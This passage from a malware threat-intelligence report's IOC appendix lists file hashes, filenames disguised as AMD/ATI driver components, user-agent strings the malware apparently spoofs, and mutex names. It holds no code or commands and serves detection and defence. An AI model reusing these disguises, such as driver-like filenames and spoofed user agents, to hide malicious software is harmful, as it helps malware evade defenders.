b47e711845d03c389004c912b3fbfc59228bb18c • 3a624b196576b03d327b43247a975da44688ffda • b5e973df0a159ab583fc8923c796c8cbf5b535df • 3b297f0ca7750c0c74e5f931fec1528fe1ba6bc9 • ba29768a2452a0e3abde02a903e53a181ee05bc8 • 3c8ba7ca3675ecc75855a58b9c0527d067c88f86 • bdd2bae83c3bab9ba0c199492fe57e70c6425dd3 • 3f0be1751afa9cb0fdd6bc6fc9874dd880bc8c1b • bf265227f9a8e22ea1c0035ac4d2449ceed43e2b • 41bb403d2549db95cfc6c851ef92ad26bdf2e906 • bf9d3a45273608caf90084c1157de2074322a230 • 42cfe068b0f476198b93393840d400424fd77f0c • c02b8c2bc15dd8a7110e5f1765716464bf421591 • 42fadc443025a132f833a4a5ed8a5350f79a86cc • c117608dab3ab632de8110f8981dd7e773c61d05 • 43a979aa6ab08685d9ce949c67e19bebbb3c3559 • c3d8a548fa0525e1e55aa592e14303fc6964d28d • 443bc2e77b10ae64af6321c2c7bfd311c0772503 • c3fde950fe7d668805b40b1680d519f20c18b899 • 44406a80f13045442ce6a28ee62a923ac8f8c56a • c5ef4c31693845d492285e5f1c7ff3c293f99976 • 482d1624f9450ca1c99926ceec2606260e7ce544 • c62e840ffe4bba50f6584b33a877475f0ebcf558 • 4975293c49ca223013088e51b8378e935322fe93 • c6472898e9085e563cd56baeb6b6e21928c5486d • 49fb759d133eeaab3fcc78cec64418e44ed649ab • c7b91ff3cc69dab807016aa76d0c261411ccf27d • 4a16674c799fae6535c82f878f6a37f94ee9a49b • c8fe2296565c211e019cdad3918a5736d4b12d44 • 5150174a4d5e5bb0bccc568e82dbb86406487510 • caa1083d2f20be0858e8d3d0671c042d0455a657 • 55bd71353408cdda1bdbbd54bc70b4c595d70e56 • cb7652aede9b1b7d756019f44c25fb0263498313 • 56ac317ed78f8016d59cb41e9283b1c08cbf149f • ccf83cd713e0f078697f9e842a06d624f8b9757e • 5bcd74e0c3c661580201e7d8122d7525a1480b4c • ce9d077349638ffd3e1ad68cda76c12cfb024069 • 5d3b82cdea4ae066efd5d127c7dd222adee62d0b • cebcf2f495c3b95138128d0577dcac5cde29490d • 5d4535df615a30b87b57facf4babf8d506e86a07 • d12e4f164a4734e8136da85001750157014d012c • 5ffe420a3cc848024884db8e2cfed68c47368dae • d3254f1f4c4def8c023982dfb28fa31e91b69ab5 • 6502bffbd1324071c7461c50a2552e48084560ae • d5cbf554e4e700b37ddcb026d4407fcd87032d87 • 662d3cb303450abae2b88699c7f48d74f84f0d5a • d89fc09f1aa72547d4b7f022470b6c8362997a5f • 669b7c98f0f697b91e95804dacdfe55fae3f0a85 • daa651188610fd9c5a6987109e7ee5504d72a35d • 69c82f6ca382bd2205d55b89f2e842b4790bda62 • e0779ac6e5cc76e91fca71efeade2a5d7f099c80 • 6b5ef7b76b35203dd323af49bfa27cfa7e1b6376 • e2d0edf2e7d4a09fad732d4113d970a56e9a6667 • 6b64ed0f4e39a1c320c7cbd342a93faed9f5df86 • e76da232ec020d133530fdd52ffcc38b7c1d7662 • 71c59eaa445346251467942bac489a9d4e807f7f • e99a03ebe3462d2399f1b819f48384f6714dcba1 • 75aeaee253b5c8ae701195e3b0f49308f3d1d932 • ea0cfe60a7b7168c42c0e86e15feb5b0c9674029 • 75e03a17d49d1b052770a21520bc13b14fc6c607 • eb851adfada7b40fc4f6c0ae348694500f878493 • 7765a0869530c1a17b8fd339bbe55cc4c1bdba30 • efd41300ccf4143d04664715e1de98cb416ffdd1 • 78e9960cc5819583fb98fb619b33bff7768ee861 • f2ffc4e1d5faec0b7c03a233524bb78e44f0e50b • 7c710cf31f20ef7e0ad1809672255d4edfdff052 • f33c980d4b6aaab1dc401226ab452ce840ad4f40 • 7c79e3205323b9917f9eedcd3d5a891d87ddf256 • f38040c70024fe9e305af5a3687e0d5993bb9e96 • 7cda99eefb5150b87278f9bcf6ac0bde534b99e8 • f7693e5d39db067d97cd91fb22522f94c59fda3d • 80935ac2ab3cf5b2900b49f6982a6a3f4575367c • f7d47c38eca7ec68aa478c06b1ba983d9bf02e15 • 81affba765aa87a0d0b12b5a213f09fd51e1e9a1 • fb1b1dc288d68f695f88c5ac036b3ab1c4f5e850 • 87668d14910c1e1bb8bbea0c6363f76e664dcd09 • feb9424386af47d550b13614c78530bc06ec876e • 883292f00e5836f99a1943a6e0164d8c6c124478 • 8ad2003b99d92dfb9d85912ee6a39c46b1ec8137 .
APPENDIX B 9 .
APPENDIX B : IOCS .
Filenames ( Note : we believe many of these to be borrowed from legitimate files ) .
• agent_wininet_dl.exe • amdh264enc32.bin • amdh264enc32.dll • amdhcp32.dll • amdhdl32.dll • amdmftdecoder_32.dll • amdmftvideodecoder_32.bin • amdmftvideodecoder_32.dll • amdmiracast.dll • amdocl_as32.exe • amdocl.bin • amdocl_ld32.exe • amd_opencl32.dll • amdpcom32.bin • atiadlxx.bin • atiadlxx.dll • atiapfxx.exe • atibtmon.exe • aticalcl.dll • aticaldd.dll • aticalrt.dll • aticfx32.bin • aticfx32.dll • atidemgy.bin • atidxx32.bin • atidxx32.dll • atieclxx.exe • atiesrxx.exe • atiglpxx.dll • atiicdxx.dat • atikmdag.sys • atimuixx.dll • atiodcli.exe • atiode.exe • atioglxx.bin • atisamu32.dll • atiu9pag.bin • atiuxpag.dll • ativce02.dat • ativvaxy_cik.dat • ativvaxy_cik_nd.dat • ativvsva.dat • ativvsvl.dat • autorun.dll • autorun_com.dll • autorun_curver.dll • clinfo.exe • coinst_13.152.dll • observers.dll • ovdecode.dll • wininetp.dll .
User agent strings .
• Java/1.8.0_25 • Java/1.8.0_26 • iTunes/12.0.1 ( Windows ; N ) • Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko • Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; rv:32.0 ) Gecko/20100101 Firefox/32.0 • Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome /34.0.1847.137 Safari/537.36 .
Mutexes .
• Mtx • qdfrty • AgentMutex .
